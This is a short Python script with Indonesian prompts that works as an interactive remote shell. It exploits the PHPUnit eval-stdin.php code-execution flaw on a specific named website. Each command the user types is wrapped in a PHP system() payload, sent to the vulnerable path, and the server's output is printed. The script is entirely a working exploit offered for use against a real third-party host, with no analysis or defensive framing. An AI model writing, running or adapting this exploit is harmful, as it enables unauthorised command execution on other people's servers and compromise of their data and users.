import requests,os

def main():
    while True:
        perintah = input("masukan perintah: ")
        checkvuln = f"<?php system('{perintah}');?>"
        Exploit = requests.get("https://tareeq-alhumam.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", data=checkvuln)
        print(Exploit.text)
        bersihkan = input('bersihkan y/n?')
        if 'y' in bersihkan:
            os.system('cls')
            main()
        else:
            break

main()